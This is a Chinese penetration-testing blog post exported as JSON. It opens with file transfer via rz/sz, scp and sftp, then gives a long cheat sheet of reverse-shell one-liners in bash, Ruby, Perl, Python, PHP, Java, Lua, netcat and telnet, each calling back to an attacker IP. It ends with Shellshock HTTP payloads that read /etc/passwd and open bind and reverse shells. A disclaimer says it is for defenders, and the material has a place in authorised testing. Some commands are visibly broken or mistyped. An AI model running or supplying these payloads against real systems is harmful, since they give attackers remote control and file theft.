{"title":"Linux下终端实现文件上传与反弹","slug":"网安大类/PenetrationNote/Linux渗透利用/Linux下终端实现文件上传与反弹","date":"2019-08-29T05:36:30.000Z","updated":"2022-03-30T05:02:09.821Z","url":"2019/8-29-393.html","path":"api/articles/2019/8-29-393.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919152409.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919152605.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919153049.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919153427.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919153514.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919154422.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919155249.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919155238.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"文件上传下载\"><a href=\"#文件上传下载\" class=\"headerlink\" title=\"文件上传下载\"></a>文件上传下载</h4><h5 id=\"1-rz-sz-命令\"><a href=\"#1-rz-sz-命令\" class=\"headerlink\" title=\"(1) rz/sz 命令\"></a>(1) rz/sz 命令</h5><p>描述:Debian里Kail中上传rz命令和下载sz命令可能需要专门的SSH连接工具才能使用;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sz 文件名.txt           <span class=\"comment\">#下载的文件</span></span><br><span class=\"line\">rz c:\\filename.txt     <span class=\"comment\">#上传windows下会弹出选择框让您选择文件</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"2-scp-命令\"><a href=\"#2-scp-命令\" class=\"headerlink\" title=\"(2) scp 命令\"></a>(2) scp 命令</h5><p>描述:scp依赖于ssh通道进行文件上传和下载<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#上传到远程</span></span><br><span class=\"line\">scp localfile.txt root@RemoteHost:/tmp/upfile.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#下载到本地</span></span><br><span class=\"line\">scp root@RemoteHost:/tmp/remotefile.txt D:\\Downloadfile.txt</span><br></pre></td></tr></table></figure><br><br></p>\n<h5 id=\"3-sftp-命令\"><a href=\"#3-sftp-命令\" class=\"headerlink\" title=\"(3) sftp 命令\"></a>(3) sftp 命令</h5><p>描述:sftp(SSH File Transfer Protocol-安全文件传送协议)也是依赖于SSH是它的一部分;采用sftp命令来登录sshd服务进行文件上传下载，可以看作是ftp服务的升级版本，它与 ftp 有着几乎一样的语法和功能。</p>\n<p><strong>语法参数：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 语法参数</span></span><br><span class=\"line\">usage: sftp [-46aCfpqrv] [-B buffer_size] [-b batchfile] [-c cipher]</span><br><span class=\"line\">    [-D sftp_server_path] [-F ssh_config] [-i identity_file] [-l <span class=\"built_in\">limit</span>]</span><br><span class=\"line\">    [-o ssh_option] [-P port] [-R num_requests] [-S program]</span><br><span class=\"line\">    [-s subsystem | sftp_server] host</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 链接格式</span></span><br><span class=\"line\">sftp [user@]host[:file ...]</span><br><span class=\"line\">sftp [user@]host[:dir[/]]</span><br><span class=\"line\">sftp -b batchfile [user@]host</span><br><span class=\"line\"><span class=\"comment\"># - 登录</span></span><br><span class=\"line\">sftp -o port=1000 username@remote ip</span><br><span class=\"line\"><span class=\"comment\"># - 上传</span></span><br><span class=\"line\">put /path/filename(本地主机) /path/filename(远端主机)</span><br><span class=\"line\"><span class=\"comment\"># - 下载</span></span><br><span class=\"line\">get /path/filename(远端主机) /path/filename(本地主机)</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><strong>命令示例:</strong></p>\n<ul>\n<li>1) 交换式命令使用说明<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 示例1.采用密匙来登录到指定的sftp服务器上并下载文件或目录到本地</span></span><br><span class=\"line\">sftp -P 2222 -i /root/.ssh/id_rsa sftpuser@192.168.1.215</span><br><span class=\"line\"><span class=\"comment\"># 下载sftp服务中index.php文件到本地</span></span><br><span class=\"line\">sftp&gt; get /var/www/html/index.php /tmp/</span><br><span class=\"line\"><span class=\"comment\"># 下载sftp服务中dir1目录及其子目录文件到本地</span></span><br><span class=\"line\">sftp&gt; get -r /remote/dir1 .</span><br><span class=\"line\"><span class=\"comment\"># 上传本地文件到sftp服务器之中</span></span><br><span class=\"line\">sftp&gt; put /tmp/weiyigeek.pdf /var/www/html/</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"常用反弹脚本\"><a href=\"#常用反弹脚本\" class=\"headerlink\" title=\"常用反弹脚本\"></a>常用反弹脚本</h4><p>描述:在渗透测试中常常需要进行反弹Shell来证明该漏洞的危害,所以再Linux/Windows(不单独罗列了)中出现以下的方式方法<br>测试环境:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AttackIP：Kail  192.168.200.252</span><br><span class=\"line\">ClientIP：Centos 192.168.200.200</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"BASH反弹Shell\"><a href=\"#BASH反弹Shell\" class=\"headerlink\" title=\"BASH反弹Shell\"></a>BASH反弹Shell</h5><p><strong>方式1:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/10.24.87.54/4444 0&gt;&amp;1   <span class=\"comment\">#Client</span></span><br><span class=\"line\">nc -lvvp 4433  <span class=\"comment\">#Attack</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919152409.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>方式2:采用文件描述符绑定反弹shell</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -i &gt; /dev/tcp/10.2.10.16/4444 0&lt;&amp;1 2&gt;&amp;1</span><br><span class=\"line\">0&lt;&amp;196;<span class=\"built_in\">exec</span> 196&lt;&gt;/dev/tcp/192.168.200.252/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919152605.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>方式3</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exec</span> 5&lt;&gt;/dev/tcp/192.168.200.252/4444</span><br><span class=\"line\"><span class=\"comment\"># or:</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> 5&lt;&gt;/dev/tcp/192.168.200.252/4444 ; <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line 0&lt;&amp;5; <span class=\"keyword\">do</span> <span class=\"variable\">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919153049.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<p><strong>方式4</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hacker: nc -nvlp 4444</span><br><span class=\"line\">Victim: /bin/bash -i &gt; /dev/tcp/192.168.200.252/4444 0&lt;&amp;1 2&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#可使用metasploit来获取shell</span></span><br><span class=\"line\">msfconsle</span><br><span class=\"line\">use exploit/multi/handler</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"ruby反弹shell\"><a href=\"#ruby反弹shell\" class=\"headerlink\" title=\"ruby反弹shell\"></a>ruby反弹shell</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ruby -rsocket -e <span class=\"string\">'f=TCPSocket.open(\"192.168.200.200\",\"4444\").to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'</span>   <span class=\"comment\">#可将sh-&gt;bash</span></span><br></pre></td></tr></table></figure>\n<p>补充:未复现成功</p>\n<p><br></p>\n<h5 id=\"perl反弹shell\"><a href=\"#perl反弹shell\" class=\"headerlink\" title=\"perl反弹shell\"></a>perl反弹shell</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e <span class=\"string\">'use Socket;$i=\"10.24.87.54\";$p=14444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;’</span></span><br></pre></td></tr></table></figure>\n<p><br></p>\n<h5 id=\"Python反弹Shell\"><a href=\"#Python反弹Shell\" class=\"headerlink\" title=\"Python反弹Shell\"></a>Python反弹Shell</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.24.87.54\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></span><br><span class=\"line\">python -c <span class=\"string\">'import pty;pty.spawn(\"/bin/sh\")'</span>   <span class=\"comment\">#可以在低权限用来sudo 获取高级权限</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919153427.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"PHP反弹Shell\"><a href=\"#PHP反弹Shell\" class=\"headerlink\" title=\"PHP反弹Shell\"></a>PHP反弹Shell</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">'$sock=fsockopen(\"192.168.200.252\",4444);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919153514.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"JAVA反弹Shell\"><a href=\"#JAVA反弹Shell\" class=\"headerlink\" title=\"JAVA反弹Shell\"></a>JAVA反弹Shell</h5><p>描述:未能复现<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">r = Runtime.getRuntime()</span><br><span class=\"line\">p = r.exec([<span class=\"string\">\"/bin/bash\"</span>,<span class=\"string\">\"-c\"</span>,<span class=\"string\">\"exec 5&lt;&gt;/dev/tcp/192.168.200.252/4444;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"</span>] as String[])</span><br><span class=\"line\">p.waitFor()</span><br></pre></td></tr></table></figure><br><br></p>\n<h5 id=\"Go反弹Shell\"><a href=\"#Go反弹Shell\" class=\"headerlink\" title=\"Go反弹Shell\"></a>Go反弹Shell</h5><p><br></p>\n<h5 id=\"LUA反弹Shell\"><a href=\"#LUA反弹Shell\" class=\"headerlink\" title=\"LUA反弹Shell\"></a>LUA反弹Shell</h5><p>描述:需要安装-未能复现<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lua5.3 -e <span class=\"string\">\"require('socket');require('os');t=socket.tcp();t:connect('192.168.200.200','4444');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"NC命令反弹Shell\"><a href=\"#NC命令反弹Shell\" class=\"headerlink\" title=\"NC命令反弹Shell\"></a>NC命令反弹Shell</h5><p><strong>方式1</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#反向连接</span></span><br><span class=\"line\">nc -e /bin/sh 192.168.200.252 4444  <span class=\"comment\">#Client</span></span><br><span class=\"line\">nc -lvvp 4444 <span class=\"comment\">#Attack</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#反向连接</span></span><br><span class=\"line\">mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/back pipe | nc 192.168.200.254 4444 1&gt;/tmp/backpipe</span><br><span class=\"line\">nc -lvnp 4444  <span class=\"comment\">#Attack</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919154422.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>方式2</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Client端</span></span><br><span class=\"line\"><span class=\"comment\"># 如果 -e 参数被禁用，可以尝试以下命令</span></span><br><span class=\"line\">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 192.168.200.252 4443 0&lt;/tmp/</span><br><span class=\"line\"><span class=\"comment\"># 如果你安装错了 netcat 的版本，请尝试以下命令</span></span><br><span class=\"line\">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.200.252 4444&gt;/tmp/f</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Attacker</span></span><br><span class=\"line\">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"telnet命令反弹shell\"><a href=\"#telnet命令反弹shell\" class=\"headerlink\" title=\"telnet命令反弹shell\"></a>telnet命令反弹shell</h5><p><strong>方式1</strong><br>描述:攻击端需要监听两个端口,一个4444端口执行命令另一个8888端口接受执行命令后的结果;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hacker: nc -nvlp 4444</span><br><span class=\"line\">Hacker: nc -nvlp 8888</span><br><span class=\"line\">Victim: telnet 192.168.200.252 4444 | /bin/bash | telnet 192.168.200.252 8888</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919155249.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><strong>方式2:</strong><br>描述:如果 netcat 不可用或者 /dev/tcp<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mknod /tmp/backpipe p &amp;&amp; telnet 192.168.200.252 4444 0&lt;/tmp/backpipe | /bin/bash 1&gt;/tmp/backpipe</span><br><span class=\"line\"><span class=\"comment\">#mknod a p; telnet x.x.x.x 2222 0&lt;a | /bin/bash 1&gt;a</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919155238.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<h5 id=\"Shellshock方式反弹shell\"><a href=\"#Shellshock方式反弹shell\" class=\"headerlink\" title=\"Shellshock方式反弹shell\"></a>Shellshock方式反弹shell</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 一个发现并利用服务器 Shellshock 的工具</span></span><br><span class=\"line\">./shocker.py -H 192.168.1.1  --<span class=\"built_in\">command</span> <span class=\"string\">\"/bin/cat /etc/passwd\"</span> -c /cgi-bin/status --verbose</span><br><span class=\"line\"><span class=\"comment\"># 查看文件</span></span><br><span class=\"line\">$ <span class=\"built_in\">echo</span> -e <span class=\"string\">\"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\"</span> | nc 192.168.56.118 80</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 绑定 shell</span></span><br><span class=\"line\">$ <span class=\"built_in\">echo</span> -e <span class=\"string\">\"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\"</span> | nc 192.168.56.118 80</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 反弹 Shell</span></span><br><span class=\"line\">$ nc -l -p 443</span><br><span class=\"line\">$ <span class=\"built_in\">echo</span> <span class=\"string\">\"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\"</span> | nc 192.168.56.118 80</span><br></pre></td></tr></table></figure>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"渗透总结","path":"api/categories/渗透总结.json"}],"tags":[{"name":"文件上传","path":"api/tags/文件上传.json"}]}